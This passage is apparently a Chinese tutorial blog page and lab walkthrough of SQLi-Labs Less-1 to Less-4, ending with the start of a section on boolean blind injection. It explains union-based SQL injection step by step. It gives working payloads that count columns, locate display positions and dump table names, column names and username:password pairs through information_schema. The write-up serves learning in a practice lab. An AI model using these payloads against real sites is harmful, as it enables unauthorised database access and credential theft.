1,2,3 --+</code>。  </li><li>观察页面回显位置（如显示数字 <code>2</code> 或 <code>3</code>）。  </li><li>替换为敏感函数：</li></ol></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; UNION SELECT 1,database(),version() --+  </span><br><span class="hljs-string">-- 回显数据库名和版本</span><br></code></pre></td></tr></table></figure><hr><p><strong>5. 提取数据库信息</strong></p><ul><li><strong>核心表</strong>：通过 <code>information_schema</code> 获取元数据：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 获取所有表名</span><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> information_schema.tables <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-comment">--+</span><br><br><span class="hljs-comment">-- 获取某表的列名（假设表名为users）</span><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> information_schema.columns <span class="hljs-keyword">WHERE</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-comment">--+</span><br><br><span class="hljs-comment">-- 提取数据（假设列名为username,password）</span><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(username,<span class="hljs-string">&#x27;:&#x27;</span>,password),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h2 id="靶场练习-2"><a href="#靶场练习-2" class="headerlink" title="靶场练习"></a>靶场练习</h2><h4 id="Less-1-单引号-字符型"><a href="#Less-1-单引号-字符型" class="headerlink" title="Less-1-单引号_字符型"></a>Less-1-单引号_字符型</h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022004608.png"></p><p>提示你输入数字值的ID作为参数</p><p>**1.**输入<code>?id=1</code>,数字不同，显示不同</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022004879.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022004485.png"></p><p>这里进入到数据库里面查询</p><p>**2.**接下来我们判断sql语句是否是拼接，是字符型还是数字型。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022004952.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022004988.png"></p><p><strong>3.<strong>可以根据结果指定是</strong>字符型</strong>且存在sql注入漏洞。因为该页面存在回显，所以我们可以使用联合查询。</p><p>联合查询原理：联合查询就是两个sql语句一起查询，两张表具有相同的列数，且字段名是一样的。</p><hr><h5 id="关于字符型注入："><a href="#关于字符型注入：" class="headerlink" title="关于字符型注入："></a>关于字符型注入：</h5><hr><ol><li><strong>Less-1 的 SQL 语句结构</strong></li></ol><p>假设后端代码逻辑如下（字符型注入）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$id&#x27;</span> LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><ul><li><code>$id</code> 是用户输入的值，用单引号 <code>&#39;</code> 包裹。</li><li>注入的目标是<strong>闭合单引号</strong>并插入恶意代码，再用注释符 <code>--+</code> 忽略后续内容。</li></ul><hr><ol start="2"><li><strong>两种输入对比分析</strong></li></ol><p><strong>场景 1：</strong><code>?id=1 order by 3 --+</code></p><p>生成的 SQL 语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1 order by 3 -- &#x27;</span> LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><ul><li><strong>问题</strong>：<ul><li>输入值 <code>1 order by 3 --+</code> 被包裹在单引号内，整体视为一个字符串。</li><li><code>order by 3</code> 是字符串内容，而非 SQL 语法。</li><li>实际执行的语句等价于：</li></ul></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1 order by 3 &#x27;</span> LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><pre><code class="hljs">- 数据库会尝试查找 `id` 值为 `1 order by 3` 的记录（视为字符串），但表中无此数据，导致无回显。</code></pre><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005086.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005688.png"></p><p><strong>场景 2：</strong><code>?id=1&#39; order by 3 --+</code></p><p>生成的 SQL 语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> <span class="hljs-comment">-- &#x27; LIMIT 0,1;</span><br></code></pre></td></tr></table></figure><ul><li><strong>关键点</strong>：<ul><li>单引号 <code>&#39;</code> 用于闭合原始 SQL 中的 <code>id=&#39;...&#39;</code>。</li><li><code>order by 3</code> 被成功注入到 SQL 语句中，成为有效语法。</li><li>注释符 <code>--+</code> 忽略后续的 <code>&#39; LIMIT 0,1</code>，最终执行：</li></ul></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><pre><code class="hljs">- 此语句合法，会按第三列排序并返回数据，页面正常回显。</code></pre><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005300.png"></p><hr><ol start="3"><li><strong>字符型注入 &amp; 数字型注入</strong></li></ol><ul><li><strong>字符型注入</strong>（如 Less-1）：<ul><li>参数被单引号包裹（<code>id=&#39;$id&#39;</code>）。</li><li><strong>必须闭合单引号</strong>才能注入代码，例如 <code>1&#39; [payload] --+</code>。</li><li>未闭合单引号会导致语法错误或逻辑失效。</li></ul></li><li><strong>数字型注入</strong>（如 Less-2）：<ul><li>参数未被引号包裹（<code>id=$id</code>）。</li><li>可直接注入代码，例如 <code>1 order by 3 --+</code>。</li><li>无需处理引号闭合问题。</li></ul></li></ul><hr><h5 id="关于注释符："><a href="#关于注释符：" class="headerlink" title="关于注释符："></a>关于注释符：</h5><hr><ol><li><strong>原始 SQL 语句的结构</strong></li></ol><p>假设后端代码的 SQL 语句如下（字符型注入）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$id&#x27;</span> LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>其中 <code>$id</code> 是用户输入的值，用单引号 <code>&#39;</code> 包裹。</p><hr><ol start="2"><li><strong>输入 <strong><code>?id=1&#39; order by 3</code></strong> 的解析</strong></li></ol><p>当输入 <code>1&#39; order by 3</code> 时，SQL 语句变为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-string">&#x27; LIMIT 0,1;</span><br></code></pre></td></tr></table></figure><ul><li><strong>问题</strong>：用户输入的单引号 <code>&#39;</code> 未闭合，导致语句变成：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-string">&#x27; ...</span><br></code></pre></td></tr></table></figure><p>末尾多了一个单引号 <code>&#39;</code>，破坏了 SQL 语法。</p><ul><li><strong>结果</strong>：数据库抛出语法错误，但应用程序可能配置为 <strong>不显示错误信息</strong>（如关闭错误回显），导致页面无回显。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005805.png"></p><hr><ol start="3"><li><strong>输入 <strong><code>?id=1&#39; order by 3 --+</code></strong> 的解析</strong></li></ol><p>当输入 <code>1&#39; order by 3 --+</code> 时，SQL 语句变为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> <span class="hljs-comment">-- &#x27; LIMIT 0,1;</span><br></code></pre></td></tr></table></figure><ul><li><strong>注释符 <strong><code>--+</code></strong> 的作用</strong>：<ul><li><code>--</code> 是 SQL 的单行注释符，<code>+</code> 在 URL 中被解析为空格，因此 <code>--+</code> 等效于 <code>-- </code>（注释符后必须跟空格）。</li><li>注释符会忽略后续所有内容，即 <code>&#39; LIMIT 0,1</code> 被注释掉。</li></ul></li><li><strong>最终语句</strong>：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><pre><code class="hljs">- 单引号 `&#39;` 被正确闭合，语句语法合法。- `order by 3` 会按第三列排序，如果表中存在至少 3 列，查询成功执行，页面正常回显数据。</code></pre><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005417.png"></p><hr><ol start="4"><li><strong>关键差异总结</strong></li></ol><table><thead><tr><th><strong>输入</strong></th><th><strong>SQL 语句</strong></th><th><strong>语法状态</strong></th><th><strong>回显原因</strong></th></tr></thead><tbody><tr><td><code>?id=1&#39; order by 3</code></td><td><code>id=&#39;1&#39; order by 3&#39; LIMIT ...</code></td><td><strong>语法错误</strong></td><td>错误被隐藏，无回显</td></tr><tr><td><code>?id=1&#39; order by 3 --+</code></td><td><code>id=&#39;1&#39; order by 3</code></td><td><strong>语法正确</strong></td><td>查询正常执行，回显数据</td></tr></tbody></table><p>补充： **注释符 **<code>--+</code></p><ul><li><code>--</code>:<br>在 SQL 中表示<strong>单行注释</strong>，用于忽略后续代码。</li><li><code>+</code>:<br>URL 中的 <code>+</code> 会被解码为<strong>空格</strong>。由于某些数据库（如 MySQL）要求注释符 <code>--</code> 后必须有一个空格，<code>--+</code> 确保注释生效，避免语法错误。</li></ul><hr><h5 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h5><p>**第一步：**首先知道表格有几列，如果报错就是超过列数，如果显示正常就是没有超出列数。</p><p>联合查询特点：</p><p>1、要求多条查询语句的查询列数是一致的！<br>2、要求多条查询语句的查询的每一列的类型和顺序最好一致<br>3、union关键字默认去重，如果使用union all 可以包含重复项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;order by 3 --+<br></code></pre></td></tr></table></figure><p>显示正常没有超出列数</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005515.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;order by 4 --+<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005398.png"></p><p>现在知道表格有三列</p><p>**第二步：**爆出显示位，就是看看表格里面那一列是在页面显示的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=-1&#x27; union select 1,2,3--+<br></code></pre></td></tr></table></figure><hr><h5 id="使用-id-1-的目的"><a href="#使用-id-1-的目的" class="headerlink" title="使用 id=-1 的目的"></a><strong>使用 <strong><code>id=-1</code></strong> 的目的</strong></h5><p>将 <code>id</code> 设置为 <code>-1</code>（或任意数据库中不存在的值）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">-- &#x27;</span><br></code></pre></td></tr></table></figure><p>此时：</p><ul><li><strong>第一条查询 (</strong><code>id=-1</code><strong>)</strong>：由于数据库中不存在 <code>id=-1</code> 的记录，这条查询会返回空结果。</li><li><strong>第二条查询 (</strong><code>UNION SELECT 1,2,3</code><strong>)</strong>：会成为唯一的返回结果，页面会直接显示 <code>1,2,3</code>，从而暴露注入点的位置</li></ul><p>如果使用 <code>id=1</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">-- &#x27;</span><br></code></pre></td></tr></table></figure><p>数据库会返回两条结果：</p><ol><li><code>id=1</code> 的真实数据。</li><li><code>UNION SELECT 1,2,3</code> 的注入数据。</li></ol><p>但页面可能只会渲染第一条结果（真实数据），导致攻击者无法看到 <code>UNION SELECT</code> 的结果。而通过 <code>id=-1</code> 强制让原查询失效，可以确保注入结果直接暴露。</p><ul><li><code>id=-1</code>** 的作用**：绕过原查询的结果，让 <code>UNION SELECT</code> 的注入内容成为唯一输出。</li><li><strong>实战意义</strong>：这是 SQL 注入中常见的技巧，用于探测回显点，进而提取数据库信息（如版本、表名、字段值等）。</li></ul><hr><p>可以看到是第二列和第三列里面的数据是显示在页面的。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005510.png"></p><p>**第三步：**获取当前数据名和版本号，这个涉及mysql数据库的一些函数，记得就行。</p><p><strong>补充知识：</strong></p><p><code>version()</code>:查看数据库版本</p><p><code>database()</code>:查看使用的数据库</p><p><code>user()</code>:查看当前用户</p><p><code>limit</code>:limit子句分批来获取所有数据</p><p><code>group_concat()</code>:一次性获取所有的数据库信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;union select 1,database(),version()--+</span><br></code></pre></td></tr></table></figure><p>通过结果知道当前数据是<code>security</code>,版本是<code>5.7.26</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005737.png"></p><p><strong>第四步：</strong> 爆表，information_schema.tables表示该数据库下的tables表，点表示下一级。where后面是条件，group_concat()是将查询到结果连接起来。如果不用group_concat查询到的只有user。</p><p>该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure><p>爆出了表名</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005991.png"></p><p>看到了<code>users</code>,于是我们查看一下这张表的字段名</p><p><strong>补充知识:</strong></p><p><code>information_schema.tables</code>:包含了数据库里所有的表</p><p><code>table_name</code>:表名</p><p><code>table_schema</code>:数据库名</p><p><code>column_name</code>:字段名</p><p> <strong>第五步</strong>：爆字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+<br></code></pre></td></tr></table></figure><p>该语句的意思是查询information_schema数据库下的columns表里面且table_users字段内容是users的所有column_name的内。注意table_name字段不是只存在于tables表，也是存在columns表中。表示所有字段对应的表名。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005209.png"></p><p>看到了username和password字段，</p><p>然后我们就去查询字段信息</p><p><strong>第六步</strong>：查字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=-1&#x27; union select 1,2,group_concat(username ,id , password) from users--+<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005147.png"></p><p>​                       </p><p> 获得了所有的账号和密码，这样我们就顺利的拿到了很重要的信息。</p><h4 id="Less-2-数字型"><a href="#Less-2-数字型" class="headerlink" title="Less-2-数字型"></a>Less-2-数字型</h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005914.png"></p><p>首先判断下，这个是什么注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;　　//出错<br><br>?id=1 and 1=1 //正常<br><br>?id=1 and 1=2　//出错<br></code></pre></td></tr></table></figure><p>可以确定为数字注入：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005317.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005239.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005060.png"></p><p>接下来我们去查库</p><p>列数为3：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005050.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005135.png"></p><p>爆出显示位：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005087.png"></p><p>爆表：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005490.png"></p><p>爆字段名：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005206.png"></p><p>查字段：得到了重要信息</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022106426.png"></p><h4 id="Less-3-单引号-括号-字符型"><a href="#Less-3-单引号-括号-字符型" class="headerlink" title="Less-3-单引号+括号_字符型"></a>Less-3-单引号+括号_字符型</h4><p>单引号测试报错,显示应该为单引号和括号组合的闭合方式</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022106699.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) --+<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006872.png"></p><p>得到数据有三列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27;) order by 4 --+<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006047.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=-1&#x27;) union select 1,2,3 --+<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006421.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=-1&#x27;) union select 1,database(),version() --+<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006465.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= &#x27;</span>security<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006702.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006212.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,2,group_concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users --+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006223.png"></p><h4 id="Less-4-双引号-括号-字符型"><a href="#Less-4-双引号-括号-字符型" class="headerlink" title="Less-4-双引号+括号_字符型"></a>Less-4-双引号+括号_字符型</h4><p>less-4是双引号+括号的闭合方式</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006287.png"></p><p>修改一下闭合方式即可，其他与前三关一致。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot;) order by 3--+<br><br>?id=-1&quot;) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot;) union select 1,database(),version()--+<br><br>?id=-1&quot;) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+<br><br>?id=-1&quot;) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username ,id , password) <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006953.png"></p><hr><p>参考书籍：</p><p><a href="https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf">sqli-labs&#x2F;mysql-injection.pdf at master · lcamry&#x2F;sqli-labs</a></p><h4 id="Background-盲注的讲解"><a href="#Background-盲注的讲解" class="headerlink" title="Background 盲注的讲解"></a>Background 盲注的讲解</h4><h5 id="1-什么是盲注？"><a href="#1-什么是盲注？" class="headerlink" title="1.什么是盲注？"></a><strong>1.什么是盲注？</strong></h5><p>盲注是SQL注入时<strong>不直接显示数据库错误信息或查询结果</strong> ，攻击者无法直接通过页面回显获取数据，而是通过观察一些差异来推断信息：页面内容变化（如“存在&#x2F;不存在”提示）、HTTP状态码（如200&#x2F;500）、响应时间差异（时间盲注）。</p><p>简单来说就是页面不会返回sql语句执行错误的信息，我们需要通过页面的正常与不正常显示来判断。</p><h5 id="2、分类"><a href="#2、分类" class="headerlink" title="2、分类"></a><strong>2、分类</strong></h5><p>布尔盲注、时间盲注、报错盲注</p><hr><h5 id="3、布尔盲注（Boolean-Based-Blind-SQLi）"><a href="#3、布尔盲注（Boolean-Based-Blind-SQLi）" class="headerlink" title="3、布尔盲注（Boolean-Based Blind SQLi）"></a><strong>3、布尔盲注（Boolean-Based Blind SQLi）</strong></h5><p>布尔盲注通过构造 <strong>逻辑条件（真&#x2F;假）</strong>，观察页面返回结果的差异，逐位推断数据库信息。条件为真 → 页面显示正常内容（如“You are in…”）；条件为假 → 页面无内容或显示错误</p><p><strong>（1）如何判断布尔盲注？</strong></p><p>以 <strong>SQLi-Labs Less-5</strong> 为例：</p><p><strong>步骤1：确认注入点类型</strong></p><ol><li>输入 <code>?id=1&#39;</code>，页面返回异常（可能为字符型注入）。</li><li>闭合单引号：<code>?id=1&#39; --+</code>，页面恢复正常 → <strong>单引号字符型注入</strong>。</li></ol><p><strong>步骤2：验证布尔盲注</strong></p><p>构造 <strong>真&#x2F;假条件</strong>，观察页面差异：</p><ul><li><strong>真条件</strong>：<code>?id=1&#39; and 1=1 --+</code> → 页面正常（如显示内容）。</li><li><strong>假条件</strong>：<code>?id=1&#39; and 1=2 --+</code> → 页面异常（无内容）。</li></ul><p><strong>结论</strong>：存在布尔盲注，页面根据条件真&#x2F;假返回不同结果。</p><p><strong>（2）布尔盲注的利用步骤</strong></p><p><strong>1. 获取数据库名</strong></p><ul><li><strong>猜解长度</strong>：<br><code>?id=1&#39; and length(database())=8 --+</code> → 若页面正常，数据库名长度为8。</li><li><strong>逐字符猜解</strong>：<br><code>?id=1&#39; and substr(database(),1,1)=&#39;s&#39; --+</code> → 第1个字符是否为<code>s</code>（重复至第8个字符）。</li></ul><p><strong>2. 获取表名</strong></p><ul><li><strong>猜解表的数量</strong>：<br><code>?id=1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+</code> → 确认是否为4张表。</li><li><strong>猜解表名长度</strong>：<br><code>?id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+</code> → 第一张表名长度是否为6。</li><li><strong>逐字符猜解表名</strong>：<br><code>?id=1&#39; and substr((select table_name from information_schema.tables where table_schema=database() limit 